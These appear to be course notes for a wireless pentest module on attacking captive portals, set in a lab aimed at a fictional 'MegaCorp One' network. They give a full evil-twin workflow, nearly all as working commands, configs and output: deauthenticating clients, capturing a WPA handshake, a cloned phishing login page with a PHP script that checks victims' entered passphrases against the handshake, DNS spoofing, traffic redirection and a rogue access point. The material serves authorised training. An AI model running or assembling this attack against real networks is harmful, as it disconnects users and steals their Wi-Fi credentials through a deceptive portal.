---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Module 11: Attacking Captive Portals

## Basic Functionality

_Just explaining how a device detects a captive portal._

## The Captive Portal Attack

### Discovery

Discovery via Airodump-ng:

{% code overflow="wrap" %}
```bash
kali@kali:~$ sudo airodump-ng -w discovery --output-format pcap wlan0mon
 CH 12 ][ Elapsed: 0 s ][ 2020-09-14 16:23

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 00:0E:08:FA:47:CD  -51        3        2    0   6  195   WPA2 CCMP   MGT  MegaCorp One
 00:0E:08:75:69:78  -70        2        0    0   1  130   OPN              MegaCorp One Guest
 00:0E:08:90:3A:5F  -75        3        0    0  11  130   WPA2 CCMP   PSK  MegaCorp One Lab

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 00:0E:08:90:3A:5F  E6:D9:CA:FE:B2:3C  -45    0 - 0e     0        2
 00:0E:08:90:3A:5F  05:E3:5C:E6:D9:A3  -68    0e-54      0        2
 00:0E:08:90:3A:5F  E6:EE:C0:FF:EE:84  -81    0 - 5e   487        6
 00:0E:08:FA:47:CD  98:D5:96:6D:25:78  -37    0 - 1e     0        2
 (not associated)   A7:AD:4B:2B:5E:EF  -54    0 - 1      3        9         Yugoslavia
 00:0E:08:75:69:78  FE:5C:BE:EF:D4:3F  -48    0 - 6      0        1
```
{% endcode %}

Deauthenticating Clients:

{% code overflow="wrap" %}
```bash
kali@kali:~$ sudo aireplay-ng -0 0 -a 00:0E:08:90:3A:5F wlan0mon
16:24:14  Waiting for beacon frame (BSSID: 00:0E:08:90:3A:5F) on channel 11
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
16:24:14  Sending DeAuth (code 7) to broadcast -- BSSID: [00:0E:08:90:3A:5F]
16:24:15  Sending DeAuth (code 7) to broadcast -- BSSID: [00:0E:08:90:3A:5F]
16:24:15  Sending DeAuth (code 7) to broadcast -- BSSID: [00:0E:08:90:3A:5F]
16:24:16  Sending DeAuth (code 7) to broadcast -- BSSID: [00:0E:08:90:3A:5F]
16:24:16  Sending DeAuth (code 7) to broadcast -- BSSID: [00:0E:08:90:3A:5F]
16:24:17  Sending DeAuth (code 7) to broadcast -- BSSID: [00:0E:08:90:3A:5F]
16:24:17  Sending DeAuth (code 7) to broadcast -- BSSID: [00:0E:08:90:3A:5F]
16:24:18  Sending DeAuth (code 7) to broadcast -- BSSID: [00:0E:08:90:3A:5F]
16:24:18  Sending DeAuth (code 7) to broadcast -- BSSID: [00:0E:08:90:3A:5F]
16:24:19  Sending DeAuth (code 7) to broadcast -- BSSID: [00:0E:08:90:3A:5F]
...
```
{% endcode %}

Discovery via Airodump-ng, capturing the handshake:

{% code overflow="wrap" %}
```bash
CH 12 ][ Elapsed: 0 s ][ 2020-09-14 16:23 ][WPA handshake:  00:0E:08:90:3A:5F ]

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 00:0E:08:FA:47:CD  -51        9        2    0   6  205   WPA2 CCMP   MGT  MegaCorp One
 00:0E:08:75:69:78  -70        7        0    0   1  178   OPN              MegaCorp One Guest
 00:0E:08:90:3A:5F  -75       12        0    0  11  225   WPA2 CCMP   PSK  MegaCorp One Lab
 ...
```
{% endcode %}

### Building the Captive Portal

To build our captive portal, we'll use apache and php scripts to save credentials the user enters. Starting off with installing Apache and PHP:

{% code overflow="wrap" %}
```bash
kali@kali:~$ sudo apt install apache2 libapache2-mod-php
...
```
{% endcode %}

Downloading MegaCorp One index page and its resources. **-r** will download recursively, and **-l2** will go two levels deep:

{% code overflow="wrap" %}
```bash
kali@kali:~$ wget -r -l2 https://www.megacorpone.com
--2020-09-10 20:00:24--  https://www.megacorpone.com/
Resolving www.megacorpone.com (www.megacorpone.com)... 3.220.87.155
Connecting to www.megacorpone.com (www.megacorpone.com)|3.220.87.155|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14603 (14K) [text/html]
Saving to: ‘www.megacorpone.com/index.html’

www.megacorpone.com/index.html                             100%[=======================================================================================================================================>]  14.26K  54.1KB/s    in 0.3s

2020-09-10 20:00:25 (54.1 KB/s) - ‘www.megacorpone.com/index.html’ saved [14603/14603]

...
```
{% endcode %}

Creating the Captive Portal index.php page:

{% code overflow="wrap" %}
```markup
<!DOCTYPE html>
<html lang="en">

	<head>
		<link href="assets/css/style.css" rel="stylesheet">
		<title>MegaCorp One - Nanotechnology Is the Future</title>
	</head>
	<body style="background-color:#000000;">
		<div class="navbar navbar-default navbar-fixed-top" role="navigation">
			<div class="container">
				<div class="navbar-header">
					<a class="navbar-brand" style="font-family: 'Raleway', sans-serif;font-weight: 900;" href="index.php">MegaCorp One</a>
				</div>
			</div>
		</div>

		<div id="headerwrap" class="old-bd">
			<div class="row centered">
				<div class="col-lg-8 col-lg-offset-2">
					<?php
						if (isset($_GET["success"])) {
							echo '<h3>Login successful</h3>';
							echo '<h3>You may close this page</h3>';
						} else {
							if (isset($_GET["failure"])) {
								echo '<h3>Invalid network key, try again</h3><br/><br/>';
							}
					?>
				<h3>Enter network key</h3><br/><br/>
				<form action="login_check.php" method="post">
					<input type="password" id="passphrase" name="passphrase"><br/><br/>
					<input type="submit" value="Connect"/>
				</form>
				<?php
						}
				?>
				</div>

				<div class="col-lg-4 col-lg-offset-4 himg ">
					<i class="fa fa-cog" aria-hidden="true"></i>
				</div>
			</div>
		</div>

	</body>
</html>
```
{% endcode %}

Copying the assets and old-site directories since they contain the CSS and the background image:

```bash
kali@kali:~$ sudo cp -r ./www.megacorpone.com/assets/ /var/www/html/portal/

kali@kali:~$ sudo cp -r ./www.megacorpone.com/old-site/ /var/www/html/portal/
```

Creating the Captive Portal login check page:

{% code overflow="wrap" %}
```php
<?php
# Path of the handshake PCAP
$handshake_path = '/home/kali/discovery-01.cap';
# ESSID
$essid = 'MegaCorp One Lab';
# Path where a successful passphrase will be written
# Apache2's user must have write permissions
# For anything under /tmp, it's actually under a subdirectory
#  in /tmp due to Systemd PrivateTmp feature:
#  /tmp/systemd-private-$(uuid)-${service_name}-${hash}/$success_path
# See https://www.freedesktop.org/software/systemd/man/systemd.exec.html
$success_path = '/tmp/passphrase.txt';
# Passphrase entered by the user
$passphrase = $_POST['passphrase'];

# Make sure passphrase exists and
# is within passphrase lenght limits (8-63 chars)
if (!isset($_POST['passphrase']) || strlen($passphrase) < 8 || strlen($passphrase) > 63) {
  header('Location: index.php?failure');
  die();
}

# Check if the correct passphrase has been found already ...
$correct_pass = file_get_contents($success_path);
if ($correct_pass !== FALSE) {

  # .. and if it matches the current one,
  # then redirect the client accordingly
  if ($correct_pass == $passphrase) {
    header('Location: index.php?success');
  } else {
    header('Location: index.php?failure');
  }
  die();
}

# Add passphrase to wordlist ...
$wordlist_path = tempnam('/tmp', 'wordlist');
$wordlist_file = fopen($wordlist_path, "w");
fwrite($wordlist_file, $passphrase);
fclose($wordlist_file);

# ... then crack the PCAP with it to see if it matches
# If ESSID contains single quotes, they need escaping
exec("aircrack-ng -e '". str_replace('\'', '\\\'', $essid) ."'" .
" -w " . $wordlist_path . " " . $handshake_path, $output, $retval);

$key_found = FALSE;
# If the exit value is 0, aircrack-ng successfully ran
# We'll now have to inspect output and search for
# "KEY FOUND" to confirm the passphrase was correct
if ($retval == 0) {
	foreach($output as $line) {
		if (strpos($line, "KEY FOUND") !== FALSE) {
			$key_found = TRUE;
			break;
		}
	}
}

if ($key_found) {

  # Save the passphrase and redirect the user to the success page
  @rename($wordlist_path, $success_path);

  header('Location: index.php?success');
} else {
  # Delete temporary file and redirect user back to login page
  @unlink($wordlist_file);

  header('Location: index.php?failure');
}
?>
```
{% endcode %}

### Networking Setup

Configuring our wireless interface for networking:

{% code overflow="wrap" %}
```bash
kali@kali:~$ sudo ip addr add 192.168.87.1/24 dev wlan0

kali@kali:~$ sudo ip link set wlan0 up
```
{% endcode %}

Installing _dnsmasq_:

{% code overflow="wrap" %}
```bash
kali@kali:~$ sudo apt install dnsmasq
...
```
{% endcode %}

Configuring **mco-dnsmaq.conf** for DHCP:

{% code overflow="wrap" %}
```bash
# Main options
# http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html
domain-needed
bogus-priv
no-resolv
filterwin2k
expand-hosts
domain=localdomain
local=/localdomain/
# Only listen on this address. When specifying an
# interface, it also listens on localhost.
# We don't want to interrupt any local resolution
# since the DNS responses will be spoofed
listen-address=192.168.87.1

# DHCP range
dhcp-range=192.168.87.100,192.168.87.199,12h
dhcp-lease-max=100
```
{% endcode %}

Configuring **mco-dnsmasq.conf** to also spoof DNS:

```bash
# This should cover most queries
# We can add 'log-queries' to log DNS queries
address=/com/192.168.87.1
address=/org/192.168.87.1
address=/net/192.168.87.1

# Entries for Windows 7 and 10 captive portal detection
address=/dns.msftncsi.com/131.107.255.255
```

{% hint style="warning" %}
When the _EnableActiveProbing_ registry key in _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Services\NlaSvc\Parameters\Internet_ is set to "0", it will disable the check. If this happens, Windows will not detect our captive portal and the user won't be able to login.
{% endhint %}

Staring dnsmasq:

```bash
kali@kali:~$ sudo dnsmasq --conf-file=mco-dnsmasq.conf
```

Confirming dnsmasq started via the _syslog_:

{% code overflow="wrap" %}
```bash
kali@kali:~$ sudo tail /var/log/syslog | grep dnsmasq
Sep 15 19:03:50 kali dnsmasq[18135]: started, version 2.82 cachesize 150
Sep 15 19:03:50 kali dnsmasq[18135]: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset auth DNSSEC loop-detect inotify dumpfile
Sep 15 19:03:50 kali dnsmasq-dhcp[18135]: DHCP, IP range 192.168.87.100 -- 192.168.87.199, lease time 12h
...
```
{% endcode %}

We can also use **netstat** to confirm it is listening on port 53 (TCP/UDP) for DNS, and on 67 (UDP) for DHCP:

```bash
kali@kali:~$ sudo netstat -lnp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address    Foreign Address    State    PID/Program name
tcp        0      0 0.0.0.0:53       0.0.0.0:*          LISTEN   18135/dnsmasq
tcp6       0      0 :::53            :::*               LISTEN   18135/dnsmasq
udp        0      0 0.0.0.0:53       0.0.0.0:*                   18135/dnsmasq
udp        0      0 0.0.0.0:67       0.0.0.0:*                   18135/dnsmasq
udp6       0      0 :::53            :::*                        18135/dnsmasq
...
```

Using **nftables** to forcefully redirect DNS to us:

{% code overflow="wrap" %}
```bash
kali@kali:~$ sudo apt install nftables

kali@kali:~$ sudo nft add table ip nat

kali@kali:~$ sudo nft 'add chain nat PREROUTING { type nat hook prerouting priority dstnat; policy accept; }'

kali@kali:~$ sudo nft add rule ip nat PREROUTING iifname "wlan0" udp dport 53 counter redirect to :53
```
{% endcode %}

Adding _mod\_rewrite_ and _mod\_alias_ rules to our **/etc/apache2/sites-enabled/000-default.conf**:

```bash
...

  # Apple
  RewriteEngine on
  RewriteCond %{HTTP_USER_AGENT} ^CaptiveNetworkSupport(.*)$ [NC]
  RewriteCond %{HTTP_HOST} !^192.168.87.1$
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L,R=302]

  # Android
  RedirectMatch 302 /generate_204 http://192.168.87.1/portal/index.php

  # Windows 7 and 10
  RedirectMatch 302 /ncsi.txt http://192.168.87.1/portal/index.php
  RedirectMatch 302 /connecttest.txt http://192.168.87.1/portal/index.php

  # Catch-all rule to redirect other possible attempts
  RewriteCond %{REQUEST_URI} !^/portal/ [NC]
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L]

</VirtualHost>
```

For the first four and last three of the above instructions, we'll need the _redirect_ module. For the two in-between those, we need the _alias_ module:

{% code overflow="wrap" %}
```bash
kali@kali:~$ sudo a2enmod rewrite
Enabling module rewrite.
To activate the new configuration, you need to run:
  systemctl restart apache2

kali@kali:~$ sudo a2enmod alias
Module alias already enabled
```
{% endcode %}

{% hint style="warning" %}
Chrome doesn't automatically check for captive portals on startup like Firefox. Typing a URL will trigger the captive portal, but with the above configuration, a search will fail. This may be because Chrome encodes the search and automatically prepends the search URL, which is HTTPS. With just HTTP in our Apache configuration, we will fail to connect to the website because the port isn't listening.

We can remedy this special case by making a HTTPS section in Apache. Note that doing so will break Firefox (and possibly other OS/software) if the victim clicks on the prompt to guide them to the captive portal. This is because of the self-signed certificate. It should work when the OS opens Firefox to log in. For these reasons, we only recommended this approach in an environment where only Chrome is used.
{% endhint %}

To do this, duplicate the whole _VirtualHost_ section, changing the port from 80 to 443, the instances of _http_ to _https_, and finally adding a SSL certificate:

{% code overflow="wrap" %}
```bash
<VirtualHost *:443>

  ServerAdmin webmaster@localhost
  DocumentRoot /var/www/html

  ErrorLog ${APACHE_LOG_DIR}/error.log
  CustomLog ${APACHE_LOG_DIR}/access.log combined

  # Apple
  RewriteEngine on
  RewriteCond %{HTTP_USER_AGENT} ^CaptiveNetworkSupport(.*)$ [NC]
  RewriteCond %{HTTP_HOST} !^192.168.87.1$
  RewriteRule ^(.*)$ https://192.168.87.1/portal/index.php [L,R=302]

  # Android
  RedirectMatch 302 /generate_204 https://192.168.87.1/portal/index.php

  # Windows 7 and 10
  RedirectMatch 302 /ncsi.txt https://192.168.87.1/portal/index.php
  RedirectMatch 302 /connecttest.txt https://192.168.87.1/portal/index.php

  # Catch-all rule to redirect other possible attempts
  RewriteCond %{REQUEST_URI} !^/portal/ [NC]
  RewriteRule ^(.*)$ https://192.168.87.1/portal/index.php [L]

  # Use existing snakeoil certificates
  SSLCertificateFile /etc/ssl/certs/ssl-cert-snakeoil.pem
  SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key
</VirtualHost>
```
{% endcode %}

{% hint style="info" %}
The snakeoil certificates are created when the _ssl-cert_ package gets installed. They shouldn't be deleted. If necessary, they can be regenerated by running `make-ssl-cert generate-default-snakeoil --force-overwrite`.
{% endhint %}

Lastly, enable the _ssl_ module:

{% code overflow="wrap" %}
```bash
kali@kali:~$ sudo a2enmod ssl
Enabling module ssl.
To activate the new configuration, you need to run:
  systemctl restart apache2

kali@kali:~$ sudo systemctl restart apache2
```
{% endcode %}

### Setting Up and Running the Rogue AP

Installing **hostapd** to run the AP:

```bash
kali@kali:~$ sudo apt install hostapd
```

Configuring the **mco-hostapd.conf** as an AP running 802.11n with the same SSID and channel as the AP we're targeting, but not using any encryption:

{% code overflow="wrap" %}
```bash
interface=wlan0
ssid=MegaCorp One Lab
channel=11

# 802.11n
hw_mode=g
ieee80211n=1

# Uncomment the following lines to use OWE instead of an open network
#wpa=2
#ieee80211w=2
#wpa_key_mgmt=OWE
#rsn_pairwise=CCMP
```
{% endcode %}

Running **hsotapd** in the background with **-B**:

{% code overflow="wrap" %}
```bash
kali@kali:~$ sudo hostapd -B mco-hostapd.conf
Configuration file: mco-hostapd.conf
nl80211: kernel reports: expected nested data
Using interface wlan0 with hwaddr 0e:31:8d:35:ea:08 and ssid "MegaCorp One Lab"
wlan0: interface state UNINITIALIZED->ENABLED
wlan0: AP-ENABLED
```
{% endcode %}

{% hint style="info" %}
Stopping hostapd will disable the interfaces, resulting in it losing its IP configuration. We must set the IP, either before or after starting hostapd before a client connects.
{% endhint %}

Checking hostapd and udhcpd logs for connections:

{% code overflow="wrap" %}
```bash
kali@kali:~$ sudo tail -f /var/log/syslog | grep -E '(dnsmasq|hostapd)'
Aug 25 15:49:20 kali hostapd: wlan0: STA 00:c4:98:12:65:1d IEEE 802.11: authenticated
Aug 25 15:49:20 kali hostapd: wlan0: STA 00:c4:98:12:65:1d IEEE 802.11: associated (aid 1)
Aug 25 15:49:20 kali hostapd: wlan0: STA 00:c4:98:12:65:1d RADIUS: starting accounting session 8C7098041457CA7F
Aug 25 15:49:21 kali dnsmasq-dhcp[18135]: DHCPDISCOVER(wlan0) 00:c4:98:12:65:1d
Aug 25 15:49:21 kali dnsmasq-dhcp[18135]: DHCPOFFER(wlan0) 192.168.87.118 00:c4:98:12:65:1d
Aug 25 15:49:21 kali dnsmasq-dhcp[18135]: DHCPREQUEST(wlan0) 192.168.87.118 00:c4:98:12:65:1d
Aug 25 15:49:21 kali dnsmasq-dhcp[18135]: DHCPACK(wlan0) 192.168.87.118 00:c4:98:12:65:1d android-8e6f8d2da38952aa
...
```
{% endcode %}

Monitoring the Apache logs:

{% code overflow="wrap" %}
```bash
kali@kali:~$ sudo tail -f /var/log/apache2/access.log
192.168.87.118 - - [25/Aug/2020:15:49:22 -0400] "GET /generate_204 HTTP/1.1" 302 568 "-" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/497.88 (KHTML, like Gecko) Version/4.0 Chrome/72.0.1535.856 Mobile Safari/497.88"
192.168.87.118 - - [25/Aug/2020:15:49:23 -0400] "GET /portal/index.php HTTP/1.1" 200 497 "-" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/497.88 (KHTML, like Gecko) Version/4.0 Chrome/72.0.1535.856 Mobile Safari/497.88"
192.168.87.118 - - [25/Aug/2020:15:49:56 -0400] "POST /portal/login_check.php HTTP/1.1" 302 235 "http://192.168.87.1/portal/index.php" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/497.88 (KHTML, like Gecko) Version/4.0 Chrome/72.0.1535.856 Mobile Safari/497.88"
192.168.87.118 - - [25/Aug/2020:15:49:57 -0400] "GET /portal/index.php?success HTTP/1.1" 200 413 "http://192.168.87.1/portal/index.php" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/497.88 (KHTML, like Gecko) Version/4.0 Chrome/72.0.1535.856 Mobile Safari/497.88"
```
{% endcode %}

Viewing the passphrase provided as shown by the previous successful redirect back to the index page:

{% code overflow="wrap" %}
```bash
kali@kali:~$ sudo find /tmp/ -iname passphrase.txt
/tmp/systemd-private-0a505bfcaf7d4db699274121e3ce3849-apache2.service-lIP3ds/tmp/passphrase.txt

kali@kali:~$ sudo cat /tmp/systemd-private-0a505bfcaf7d4db699274121e3ce3849-apache2.service-lIP3ds/tmp/passphrase.txt
NanotechIsTheFuture
```
{% endcode %}

## Additional Behaviors Surrounding Captive Portals

_Redirects to captive portals aren't a guarantee._
